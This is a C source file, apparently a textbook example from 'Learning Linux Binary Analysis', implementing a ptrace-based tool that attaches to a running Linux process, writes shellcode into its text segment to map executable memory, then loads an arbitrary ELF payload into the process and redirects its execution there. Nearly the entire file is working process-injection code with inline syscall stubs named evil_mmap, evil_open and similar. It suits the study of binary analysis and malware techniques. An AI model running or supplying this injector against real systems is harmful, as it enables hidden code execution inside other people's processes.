/*
*   Example of a tool to inject a shellcode into
*   a running process.
*   Example from: Learning Linux Binary Analysis.
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <sys/mman.h>

#define PAGE_ALIGN(x) (x & ~(PAGE_SIZE - 1))
#define PAGE_ALIGN_UP(x) (PAGE_ALIGN(x) + PAGE_SIZE)
#define WORD_ALIGN(x) ((x + 7) & ~7)
#define BASE_ADDRESS 0x00100000

#define MAX_PATH 512

typedef struct handle
{
    /*
    * Elf structures
    */
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    Elf64_Shdr *shdr;
    /*
    * Mem buffer pointer
    */
    uint8_t *mem;
    /*
    * PID of process to inject
    */
    pid_t pid;
    /*
    * pointer to shellcode
    */
    uint8_t *shellcode;
    /*
    * information about binary
    * & process
    */
    char *exec_path;
    uint64_t base;
    uint64_t stack;
    uint64_t entry;
    struct user_regs_struct pt_reg;
} handle_t;

/*
* Function declarations
*/
static inline volatile void *evil_mmap(void *, uint64_t, uint64_t, uint64_t, int64_t, uint64_t) __attribute((aligned(8), __always_inline__));
uint64_t injection_code(void *, size_t) __attribute__((aligned(8)));
uint64_t get_text_base(pid_t);
int pid_write(int, void *, const void *, size_t);
uint8_t *create_fn_shellcode(void (*fn)(), size_t len);

/*
* Get pointer to functions
* to later calculate size
* of first one.
*/
void *f1 = injection_code;
void *f2 = get_text_base;

static inline volatile long
evil_write(long fd, char *buf, unsigned long len)
/*
* inline syscall for write function
*/
{
    long ret;
    // syscall to write (1)
    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%rdx\n"
        "mov $1, %%rax\n"
        "syscall"
        :
        : "g"(fd), "g"(buf), "g"(len));

    asm("mov %%rax, %0"
        : "=r"(ret));

    return ret;
}

static inline volatile int
evil_fstat(long fd, struct stat *buf)
/*
* inline syscall for fstat
*/
{
    long ret;
    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov $5, %%rax\n"
        "syscall"
        :
        : "g"(fd), "g"(buf));

    asm("mov %%rax, %0"
        : "=r"(ret));

    return ret;
}

static inline volatile int
evil_open(const char *path, unsigned long flags)
/*
* inline syscall for open
*/
{
    long ret;

    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov $2, %%rax\n"
        "syscall"
        :
        : "g"(path), "g"(flags));

    asm("mov %%rax, %0"
        : "=r"(ret));

    return ret;
}

static inline volatile void *
evil_mmap(void *addr, uint64_t len, uint64_t prot, uint64_t flags, int64_t fd, uint64_t off)
/*
* inline syscall for mmap
*/
{
    long mmap_fd = fd;
    unsigned long mmap_off = off;
    unsigned long mmap_flags = flags;
    unsigned long ret;

    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%rdx\n"
        "mov %3, %%r10\n"
        "mov %4, %%r8\n"
        "mov %5, %%r9\n"
        "mov $9, %%rax\n"
        "syscall\n"
        :
        : "g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(mmap_fd), "g"(mmap_off));

    asm("mov %%rax, %0"
        : "=r"(ret));
    return (void *)ret;
}

uint64_t
injection_code(void *vaddr, size_t length)
/*
* First part of the injected
* code, this mmap the base
* address (maybe changing its
* permissions)
*/
{
    volatile void *mem;
    // allocate memory in base address
    mem = evil_mmap(vaddr, length, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    // software breakpoint interruption
    __asm__ __volatile__("int3");
}

uint64_t
get_text_base(pid_t pid)
/*
* Get the base address of the TEXT
* SEGMENT. This is in the map the
* first with read-exec permissions.
*/
{
    char maps[MAX_PATH], line[MAX_PATH / 2];
    char *start, *p;
    FILE *fd;
    int i;
    Elf64_Addr base;

    snprintf(maps, MAX_PATH - 1, "/proc/%d/maps", pid);

    if ((fd = fopen(maps, "r")) == NULL)
    {
        fprintf(stderr, "Cannot open %s for reasing: %s\n", maps, strerror(errno));
        return 1;
    }

    while (fgets(line, sizeof(line), fd))
    {
        /*
        * Get the first line with
        * read-execute permission.
        */
        if (!strstr(line, "r-xp"))
            continue;

        /*
        * Read the line until does
        * not find '-' (separate)
        * memory range.
        */
        for (i = 0, start = alloca(32), p = line; *p != '-'; i++, p++)
            start[i] = *p;
        start[i] = '\0';
        base = strtoul(start, NULL, 16);
        break;
    }
    fclose(fd);
    return base;
}

uint8_t *
create_fn_shellcode(void (*fn)(), size_t len)
/*
* Copy a function into an allocated
* buffer.
*/
{
    size_t i;
    uint8_t *shellcode = (uint8_t *)malloc(len);
    uint8_t *p = (uint8_t *)fn;

    /*
    * Copy given function to allocated
    * memory.
    */
    for (i = 0; i < len; i++)
        *(shellcode + i) = *p++;

    return shellcode;
}

int 
pid_read(int pid, void *dst, const void *src, size_t len)
{
    int sz = len / sizeof(void *);
    int remainder = len % sizeof(void *);
    unsigned char *s = (unsigned char *)src;
    unsigned char *d = (unsigned char *)dst;
    long word;
    long mask_byte = 0;

    while (sz-- != 0)
    {
        word = ptrace(PTRACE_PEEKTEXT, pid, s, NULL);

        if (word == -1 && errno)
        {
            fprintf(stderr, "pid_read failed, pid: %d: %s\n", pid, strerror(errno));
            perror("PTRACE_PEEKTEXT");
            return -1;
        }

        *(long *)d = word;
        s += sizeof(long);
        d += sizeof(long);
    }

    switch (remainder)
    {
    case 0x1:
        mask_byte = 0xff;
        break;
    case 0x2:
        mask_byte = 0xffff;
        break;
    case 0x3:
        mask_byte = 0xffffff;
        break;
    case 0x4:
        mask_byte = 0xffffffff;
        break;
    case 0x5:
        mask_byte = 0xffffffffff;
        break;
    case 0x6:
        mask_byte = 0xffffffffffff;
        break;
    case 0x7:
        mask_byte = 0xffffffffffffff;
        break;
    default:
        break;
    }
    if (remainder != 0)
    {
        word = ptrace(PTRACE_PEEKTEXT, pid, s, 0x0);
        if (word == -1 && errno)
        {
            fprintf(stderr, "pid_read failed, pid: %d: %s\n", pid, strerror(errno));
            perror("PTRACE_PEEKTEXT");
            return -1;
        }

        *(long *)d = *d & ~mask_byte | word & mask_byte;
        s += remainder;
        d += remainder;
    }

    return 0;
}

int 
pid_write(int pid, void *dst, const void *src, size_t len)
{
    int sz = len / sizeof(void *);
    int remainder = len % sizeof(void *);
    unsigned char *s = (unsigned char *)src;
    unsigned char *d = (unsigned char *)dst;
    long last_value = 0;
    long mask_byte = 0;

    while (sz-- != 0)
    {
        if (ptrace(PTRACE_POKETEXT, pid, d, *(void **)s) < 0)
        {
            fprintf(stderr, "pid_write failed, pid: %d: %s\n", pid, strerror(errno));
            perror("PTRACE_POKETEXT");
            return -1;
        }

        s += sizeof(void *);
        d += sizeof(void *);
    }

    switch (remainder)
    {
    case 0x1:
        mask_byte = 0xff;
        break;
    case 0x2:
        mask_byte = 0xffff;
        break;
    case 0x3:
        mask_byte = 0xffffff;
        break;
    case 0x4:
        mask_byte = 0xffffffff;
        break;
    case 0x5:
        mask_byte = 0xffffffffff;
        break;
    case 0x6:
        mask_byte = 0xffffffffffff;
        break;
    case 0x7:
        mask_byte = 0xffffffffffffff;
        break;
    default:
        break;
    }

    if (remainder != 0)
    {
        last_value = ptrace(PTRACE_PEEKDATA, pid, d, NULL);
        *(long *)s = *(long *)s & mask_byte | ~mask_byte & last_value;
        ptrace(PTRACE_POKETEXT, pid, d, *(void **)s);
    }

    return 0;
}

int 
main(int argc, char **argv)
{
    handle_t h;
    unsigned long shellcode_size = f2 - f1;
    int i, fd, status;
    uint8_t *executable, *origcode;
    struct stat st;
    Elf64_Ehdr *ehdr;
    struct user_regs_struct pt_reg_bk;


    if (argc < 3)
    {
        printf("Usage: %s <pid> <executable>\n", argv[0]);
        exit(-1);
    }

    h.pid = atoi(argv[1]);
    h.exec_path = strdup(argv[2]);

    printf("[+] Attaching to %d\n", h.pid);
    // attach to pid (this must be 64 bits)
    if (ptrace(PTRACE_ATTACH, h.pid) < 0)
    {
        perror("PTRACE_ATTACH");
        exit(-1);
    }
    wait(NULL);
    printf("[+] Getting base address\n");
    // get base of TEXT SEGMENT
    h.base = get_text_base(h.pid);

    printf("[+] Process base address: 0x%016x\n", h.base);

    shellcode_size += 8;

    printf("[+] Moving shellcode to a buffer\n");
    h.shellcode = create_fn_shellcode((void *)&injection_code, shellcode_size);

    // memory for original code
    origcode = alloca(shellcode_size);

    printf("[+] Reading original code\n");
    if (pid_read(h.pid, (void *)origcode, (void *)h.base, shellcode_size) < 0)
        exit(-1);
    printf("[+] Done.\n");
    printf("[+] Writing shellcode.\n");
    if (pid_write(h.pid, (void *)h.base, (void *)h.shellcode, shellcode_size) < 0)
        exit(-1);
    printf("[+] Done\n");

    if (ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0)
    {
        perror("PTRACE_GETREGS");
        exit(-1);
    }

    // store backup of regs
    memcpy(&pt_reg_bk, &h.pt_reg, sizeof(pt_reg_bk));

    // open new payload
    // size is necessary
    // to allocate enough size
    if ((fd = open(h.exec_path, O_RDONLY)) < 0)
    {
        perror("open");
        exit(-1);
    }

    if (fstat(fd, &st) < 0)
    {
        perror("fstat");
        exit(-1);
    }

    // modify program counter value
    // and set rdi(first param) to base address
    h.pt_reg.rip = h.base;
    h.pt_reg.rdi = BASE_ADDRESS;
    h.pt_reg.rsi = WORD_ALIGN(st.st_size);
    
    printf("[+] Modifying RIP to point to the first shellcode.\n");
    if (ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0)
    {
        perror("PTRACE_SETREGS");
        exit(-1);
    }
    printf("[+] Done.\n");
    printf("[+] Start execution again.\n");
    if (ptrace(PTRACE_CONT, h.pid, NULL, NULL) < 0)
    {
        perror("PTRACE_CONT");
        exit(-1);
    }
    
    /*
    * Wait for the breakpoint.
    */
    wait(&status);

    /*
    * No breakpoint? error
    */
    if (WIFSTOPPED(status) && WSTOPSIG(status) != SIGTRAP)
    {
        printf("Error not recognized stop reason\n");
        exit(-1);
    }

    // restore bytes
    printf("[+] Received SIGTRAP.\n");
    printf("[+] Restoring original bytes.\n");
    if (pid_write(h.pid, (void *)h.base, (void *)origcode, shellcode_size) < 0)
        exit(-1);
    printf("[+] Done.\n");
    
    // get enough memory aligned to memory page
    executable = malloc(WORD_ALIGN(st.st_size));

    // read new payload
    printf("[+] Reading and parsing final payload.\n");
    if (read(fd, executable, st.st_size) < 0)
    {
        perror("read");
        exit(-1);
    }

    // get its entry point
    ehdr = (Elf64_Ehdr *)executable;
    h.entry = ehdr->e_entry;

    close(fd);
    printf("[+] Done.\n");
    printf("[+] Writing %d bytes from payload to remote process.\n", st.st_size);
    // write it to base address of text
    if (pid_write(h.pid, (void *)BASE_ADDRESS, (void *)executable, st.st_size) < 0)
        exit(-1);
    printf("[+] Done.\n");

    printf("[+] Setting program counter to new payload entry.\n");
    // Set program counter to entry point of payload
    if (ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0)
    {
        perror("PTRACE_GETREGS");
        exit(-1);
    }

    h.entry = BASE_ADDRESS + h.entry;
    h.pt_reg.rip = h.entry;

    if (ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0)
    {
        perror("PTRACE_SETREGS");
        exit(-1);
    }
    printf("[+] Done.\n");

    printf("[+] Executing second payload.\n");

    if (ptrace(PTRACE_CONT, h.pid, NULL, NULL) < 0)
    {
        perror("PTRACE_CONT");
        exit(-1);
    }

    wait(&status);
    /*
    * No breakpoint? error
    */
    if (WIFSTOPPED(status) && WSTOPSIG(status) != SIGTRAP)
    {
        printf("Error not recognized stop reason\n");
        exit(-1);
    }

    printf("[+] Received SIGTRAP, restoring registers.\n");

    if (ptrace(PTRACE_SETREGS, h.pid, NULL, &pt_reg_bk) < 0)
    {
        perror("PTRACE_SETREGS");
        exit(-1);
    }

    printf("[+] Done.\n");
    
    printf("[+] Detaching and finishing...\n");
    if (ptrace(PTRACE_DETACH, h.pid, NULL, NULL) < 0)
    {
        perror("PTRACE_DETACH");
        exit(-1);
    }
    
    wait(NULL);

    exit(0);
}